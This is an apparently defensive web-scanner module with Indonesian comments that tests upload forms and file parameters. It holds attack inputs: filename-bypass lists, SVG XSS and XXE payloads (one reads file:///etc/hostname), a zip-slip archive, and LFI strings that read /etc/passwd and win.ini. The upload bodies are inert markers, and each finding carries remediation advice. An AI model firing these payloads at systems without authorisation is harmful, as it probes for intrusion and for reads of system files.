"""Deep file-infiltration scanner.

Pelengkap `file_upload.py` yang fokus pada *acceptance* file mencurigakan.
`file_inject` melangkah lebih jauh:

    1. **Filename bypass**         — null-byte, double-extension, RTL override,
       alternate executable ext (.phtml, .phar, .pht, .php5, .jspx, .aspx,
       .cer, .shtml, .pl, .cgi), case-insensitive (.PhP), spasi/titik akhir.
    2. **MIME / magic spoofing**   — kirim header magic gambar valid (PNG/
       GIF/JPEG) tapi body memuat code; juga pakai polyglot (GIF89a + SVG).
    3. **Content-Type spoof**      — Content-Type: image/jpeg untuk file
       executable.
    4. **SVG XSS / XXE**           — SVG dengan `<script>`, `onload=`, atau
       SYSTEM entity untuk XXE.
    5. **Zip-slip & archive**      — upload ZIP berisi entry `../etc/passwd`
       atau `../../shell.txt`.
    6. **Path traversal in name**  — filename `../cyberloka.txt`.
    7. **LFI via path param**      — query string ber-key `file/path/include`
       dilewati payload `../../etc/passwd`.
    8. **Reverify** — saat server membalas dengan URL hasil upload, scanner
       langsung GET URL tersebut untuk memastikan marker dapat diakses publik
       (ini elevasi ke severity CRITICAL).

Semua payload **non-eksekutif** (HTML komentar marker), aman untuk legal
testing terhadap target sendiri.
"""
from __future__ import annotations

import io
import re
import zipfile
from urllib.parse import urljoin, urlparse

from cyberloka.active._helpers import iter_param_urls
from cyberloka.core import Finding, HttpClient, Severity, Target
from cyberloka.core.config import ScanConfig
from cyberloka.core.util import truncate
from cyberloka.recon.crawler import get_state

# Marker unik (HTML comment, tidak eksekutif)
MARKER = b"<!--cyberloka-fileinject-marker-->"
MARKER_TXT = MARKER.decode("ascii")
MARKER_BARE = "cyberloka-fileinject-marker"

# Magic bytes
PNG_MAGIC = b"\x89PNG\r\n\x1a\n"
GIF89A = b"GIF89a"
JPEG_MAGIC = b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01"

UPLOAD_HINTS = re.compile(
    r"upload|avatar|photo|picture|attachment|berkas|lampiran|ktp|bukti|"
    r"document|file|image|gambar|profile",
    re.I,
)

# Parameter pada query yang sering jadi LFI vector.
LFI_PARAMS = re.compile(r"^(file|path|page|include|template|view|"
                        r"document|doc|berkas|filepath)$", re.I)

# ----------------------------------------------------------------------------
# Filename / payload matrix
# ----------------------------------------------------------------------------
FILENAME_BYPASSES: list[tuple[str, str, str, Severity]] = [
    # (label, filename, content-type, severity_if_accepted)
    ("ekstensi PHP biasa", "cyberloka.php", "application/octet-stream",
     Severity.CRITICAL),
    ("phtml", "cyberloka.phtml", "application/octet-stream", Severity.CRITICAL),
    ("phar", "cyberloka.phar", "application/octet-stream", Severity.CRITICAL),
    ("pht", "cyberloka.pht", "application/octet-stream", Severity.HIGH),
    ("php5", "cyberloka.php5", "application/octet-stream", Severity.HIGH),
    ("php7", "cyberloka.php7", "application/octet-stream", Severity.HIGH),
    ("PHP uppercase", "cyberloka.PHP", "application/octet-stream",
     Severity.HIGH),
    ("PhP mixed case", "cyberloka.PhP", "application/octet-stream",
     Severity.HIGH),
    ("double-ext php.jpg", "cyberloka.php.jpg", "image/jpeg", Severity.HIGH),
    ("double-ext jpg.php", "cyberloka.jpg.php", "image/jpeg", Severity.HIGH),
    ("trailing space", "cyberloka.php ", "image/jpeg", Severity.HIGH),
    ("trailing dot", "cyberloka.php.", "image/jpeg", Severity.HIGH),
    ("null byte", "cyberloka.php\x00.jpg", "image/jpeg", Severity.HIGH),
    ("rtl override", "cyberloka\u202egnp.php", "image/png", Severity.HIGH),
    ("aspx", "cyberloka.aspx", "application/octet-stream", Severity.CRITICAL),
    ("jsp", "cyberloka.jsp", "application/octet-stream", Severity.CRITICAL),
    ("jspx", "cyberloka.jspx", "application/octet-stream", Severity.HIGH),
    ("shtml", "cyberloka.shtml", "application/octet-stream", Severity.MEDIUM),
    ("cer", "cyberloka.cer", "application/octet-stream", Severity.MEDIUM),
    ("htaccess", ".htaccess", "text/plain", Severity.HIGH),
    ("path traversal", "../cyberloka.txt", "text/plain", Severity.HIGH),
    ("path traversal urlenc", "..%2fcyberloka.txt", "text/plain",
     Severity.MEDIUM),
]


def _payload_for(fname: str) -> bytes:
    """Pilih body sesuai filename (magic byte gambar untuk yang terkesan
    image, plain marker untuk yang lain)."""
    low = fname.lower()
    if low.endswith((".jpg", ".jpeg")) or "jpg" in low or "jpeg" in low:
        return JPEG_MAGIC + MARKER + b"\xff\xd9"
    if ".png" in low or low.endswith(".png"):
        return PNG_MAGIC + MARKER
    if ".gif" in low or low.endswith(".gif"):
        return GIF89A + MARKER + b";"
    if low.endswith(".svg"):
        return (b'<?xml version="1.0"?>'
                b'<svg xmlns="http://www.w3.org/2000/svg">'
                + MARKER +
                b'<text>m</text></svg>')
    return MARKER + b"x"


SVG_XSS = (
    b'<?xml version="1.0" standalone="no"?>'
    b'<svg xmlns="http://www.w3.org/2000/svg" onload="window.parent.postMessage(\'cyberloka-svg-xss\',\'*\')">'
    + MARKER +
    b'<script>/*' + MARKER + b'*/</script></svg>'
)

SVG_XXE = (
    b'<?xml version="1.0"?>'
    b'<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>'
    b'<svg xmlns="http://www.w3.org/2000/svg">' + MARKER +
    b'<text>&xxe;</text></svg>'
)

POLYGLOT_GIF_HTML = (
    GIF89A + b"/*" + MARKER + b"*/" +
    b"<html><body>" + MARKER + b"</body></html>;"
)


def _zip_slip_payload() -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("../../../tmp/cyberloka-zipslip.txt", MARKER + b" zipslip")
        z.writestr("normal.txt", MARKER + b" normal entry")
    return buf.getvalue()


# ============================================================================
# Discovery
# ============================================================================
def _upload_forms(config: ScanConfig) -> list[dict]:
    state = get_state(config)
    if not state:
        return []
    out: list[dict] = []
    seen: set[str] = set()
    for f in state.forms:
        action = f.get("action") or ""
        if action in seen:
            continue
        if any((i.get("type") or "").lower() == "file" for i in f["inputs"]):
            out.append(f); seen.add(action); continue
        if UPLOAD_HINTS.search(action.lower()):
            out.append(f); seen.add(action)
    return out[:4]


def _lfi_param_urls(config: ScanConfig) -> list[str]:
    state = get_state(config)
    if not state:
        return []
    out: list[str] = []
    for u in state.param_urls:
        from urllib.parse import parse_qsl, urlparse
        for k, _ in parse_qsl(urlparse(u).query):
            if LFI_PARAMS.match(k):
                out.append(u)
                break
    return out[:5]


# ============================================================================
# Reverify helper — try to find URL of uploaded file and confirm marker
# ============================================================================
URL_IN_RESPONSE_RE = re.compile(
    r'https?://[^\s"\'<>]+|/(?:uploads?|files?|media|storage|public|cdn)/[^\s"\'<>]+',
    re.I,
)


def _find_uploaded_url(target: Target, body: str, fname: str) -> str | None:
    # Cari URL yang memuat fragment dari nama file kita (tanpa ekstensi
    # yang berbahaya).
    base_token = re.split(r"[./\\]", fname)[0].split("\x00")[0]
    if len(base_token) < 5:
        base_token = "cyberloka"
    candidates: list[str] = []
    for m in URL_IN_RESPONSE_RE.finditer(body):
        u = m.group(0)
        if base_token.lower() not in u.lower():
            continue
        if u.startswith("/"):
            u = urljoin(target.origin + "/", u.lstrip("/"))
        candidates.append(u)
    return candidates[0] if candidates else None


def _verify_marker_reachable(client: HttpClient, url: str) -> bool:
    r = client.get(url)
    if r is None:
        return False
    if r.status_code != 200:
        return False
    body = r.text or ""
    if MARKER_BARE in body or MARKER_TXT in body:
        return True
    # Untuk binary (gambar), check bytes
    if r.content and MARKER in r.content:
        return True
    return False


# ============================================================================
# Probes
# ============================================================================
def _probe_filename_bypass(client: HttpClient, target: Target,
                           form: dict) -> list[Finding]:
    out: list[Finding] = []
    file_field = next(
        (i for i in form["inputs"] if (i.get("type") or "").lower() == "file"),
        None,
    )
    if not file_field:
        return out
    field_name = file_field["name"]
    other = {
        i["name"]: (i.get("value") or "x")
        for i in form["inputs"]
        if i is not file_field and i.get("type") not in ("submit", "button")
    }
    seen_label: set[str] = set()
    for label, fname, ctype, sev in FILENAME_BYPASSES:
        body_bytes = _payload_for(fname)
        files = {field_name: (fname, io.BytesIO(body_bytes), ctype)}
        try:
            r = client.post(form["action"], data=other, files=files)
        except Exception:
            continue
        if r is None or r.status_code >= 500:
            continue
        rbody = r.text or ""
        accepted = r.status_code in (200, 201) and not any(
            m in rbody.lower()
            for m in ("invalid", "not allowed", "tipe file",
                      "ekstensi tidak", "file type")
        )
        if not accepted:
            continue
        # Coba cari URL hasil upload dan verifikasi
        uploaded = _find_uploaded_url(target, rbody, fname)
        confirmed = uploaded and _verify_marker_reachable(client, uploaded)
        final_sev = (Severity.CRITICAL if confirmed else sev)
        f = Finding(
            module="file_inject",
            title=(f"File mencurigakan diterima ({label}): `{fname}`"
                   + (" — terbukti dapat diakses" if confirmed else "")),
            severity=final_sev,
            description=(
                f"Form upload menerima `{fname}` (Content-Type {ctype}). "
                + ("File berhasil diakses publik dan marker kami terbaca — "
                   "ini bisa eksekusi server-side bila handler salah."
                   if confirmed else
                   "Verifikasi manual: cek apakah file dapat di-akses ulang "
                   "& di-execute oleh server.")
            ),
            target=form["action"],
            evidence=truncate(
                f"status={r.status_code} fname={fname!r} "
                f"upload_url={uploaded or '-'} body={rbody[:160]}",
                280,
            ),
            cwe="CWE-434",
            confidence=("confirmed" if confirmed else "tentative"),
            remediation=(
                "Whitelist ekstensi & MIME (cek isi file via libmagic, "
                "bukan hanya header). Generate nama file random server-side. "
                "Simpan di luar webroot atau di object storage. Serve via "
                "endpoint yang men-set Content-Type aman & header "
                "`Content-Disposition: attachment` untuk non-image."
            ),
            references=[
                "https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html",
            ],
            urls=[uploaded] if uploaded else [],
            extra=({"reverify": {"marker": MARKER_BARE, "in_body": True}}
                   if confirmed else
                   {"reverify": {"status": (200, 201)}}),
        )
        if label not in seen_label:
            seen_label.add(label)
            out.append(f)
        # Stop kalau sudah dapat 1 confirmed CRITICAL — sudah cukup.
        if confirmed:
            break
    return out


def _probe_special_payloads(client: HttpClient, target: Target,
                            form: dict) -> list[Finding]:
    """SVG XSS, SVG XXE, polyglot GIF, zip-slip."""
    out: list[Finding] = []
    file_field = next(
        (i for i in form["inputs"] if (i.get("type") or "").lower() == "file"),
        None,
    )
    if not file_field:
        return out
    field_name = file_field["name"]
    other = {
        i["name"]: (i.get("value") or "x")
        for i in form["inputs"]
        if i is not file_field and i.get("type") not in ("submit", "button")
    }
    payloads = [
        ("SVG XSS", "cyberloka-xss.svg", "image/svg+xml", SVG_XSS,
         Severity.HIGH, "CWE-79"),
        ("SVG XXE", "cyberloka-xxe.svg", "image/svg+xml", SVG_XXE,
         Severity.HIGH, "CWE-611"),
        ("GIF/HTML polyglot", "cyberloka.gif", "image/gif",
         POLYGLOT_GIF_HTML, Severity.MEDIUM, "CWE-434"),
        ("ZIP-slip archive", "cyberloka.zip", "application/zip",
         _zip_slip_payload(), Severity.HIGH, "CWE-22"),
    ]
    for label, fname, ctype, payload, sev, cwe in payloads:
        files = {field_name: (fname, io.BytesIO(payload), ctype)}
        try:
            r = client.post(form["action"], data=other, files=files)
        except Exception:
            continue
        if r is None or r.status_code >= 500:
            continue
        rbody = r.text or ""
        if r.status_code not in (200, 201):
            continue
        # Pastikan tidak di-reject
        if any(m in rbody.lower() for m in ("invalid", "not allowed",
                                             "tidak diizinkan", "rejected")):
            continue
        uploaded = _find_uploaded_url(target, rbody, fname)
        confirmed = uploaded and _verify_marker_reachable(client, uploaded)
        out.append(Finding(
            module="file_inject",
            title=f"Payload {label} diterima upload-form"
                   + (" + dapat diakses" if confirmed else ""),
            severity=Severity.CRITICAL if confirmed else sev,
            description=(
                f"Server menerima payload {label}. "
                + ("File terkonfirmasi accessible publik."
                   if confirmed else
                   "Verifikasi manual: render SVG di browser / extract ZIP "
                   "untuk konfirmasi dampak.")
            ),
            target=form["action"],
            evidence=truncate(
                f"status={r.status_code} fname={fname} "
                f"upload_url={uploaded or '-'} body={rbody[:140]}",
                280,
            ),
            cwe=cwe,
            confidence="confirmed" if confirmed else "tentative",
            remediation=(
                "SVG: strip `<script>` & event handler, sanitize via DOMPurify "
                "atau render sebagai PNG sisi server. "
                "ZIP: validasi setiap entry path tidak mengandung `..` dan "
                "absolute path. "
                "Polyglot: deteksi via `file(1)`/libmagic, tolak file yang "
                "punya magic ganda."
            ),
            urls=[uploaded] if uploaded else [],
            extra=({"reverify": {"marker": MARKER_BARE, "in_body": True}}
                   if confirmed else
                   {"reverify": {"status": (200, 201)}}),
        ))
    return out


def _probe_lfi_param(client: HttpClient, target: Target,
                     config: ScanConfig) -> list[Finding]:
    """File-parameter inclusion: ?file=../../etc/passwd"""
    out: list[Finding] = []
    urls = _lfi_param_urls(config)
    if not urls:
        return out
    payloads = [
        ("../" * 6 + "etc/passwd", re.compile(r"root:.*:0:0:")),
        ("..\\" * 6 + "windows\\win.ini", re.compile(r"\[fonts\]|\[extensions\]",
                                                     re.I)),
        ("file:///etc/passwd", re.compile(r"root:.*:0:0:")),
        ("php://filter/convert.base64-encode/resource=index",
         re.compile(r"^[A-Za-z0-9+/=]{40,}$", re.M)),
    ]
    seen: set[str] = set()
    for url in urls:
        for payload, marker_re in payloads:
            for param, mutated in iter_param_urls(url, payload):
                if (param, payload) in seen:
                    continue
                seen.add((param, payload))
                r = client.get(mutated)
                if r is None:
                    continue
                body = r.text or ""
                m = marker_re.search(body)
                if not m:
                    continue
                out.append(Finding(
                    module="file_inject",
                    title=f"Local-file-inclusion via parameter `{param}`",
                    severity=Severity.CRITICAL,
                    description=(
                        "Parameter file/path menerima traversal payload dan "
                        "membalas isi file sistem. Attacker dapat membaca "
                        "kredensial/konfigurasi sensitif."
                    ),
                    target=mutated,
                    evidence=truncate(m.group(0), 160),
                    cwe="CWE-22",
                    confidence="confirmed",
                    remediation=(
                        "Whitelist nama file (basename + path lookup ke direktori "
                        "yang diijinkan saja). Hapus `..` dan null byte. "
                        "Jangan teruskan input user langsung ke `include()` / "
                        "`open()`."
                    ),
                    extra={"reverify": {"marker": "root:", "in_body": True}},
                ))
                return out  # cukup satu PoC kuat
    return out


# ============================================================================
# Entry-point
# ============================================================================
def run(target: Target, config: ScanConfig) -> list[Finding]:
    findings: list[Finding] = []
    client = HttpClient(config)
    try:
        forms = _upload_forms(config)
        for form in forms:
            findings += _probe_filename_bypass(client, target, form)
            findings += _probe_special_payloads(client, target, form)
        findings += _probe_lfi_param(client, target, config)
    finally:
        client.close()
    return findings
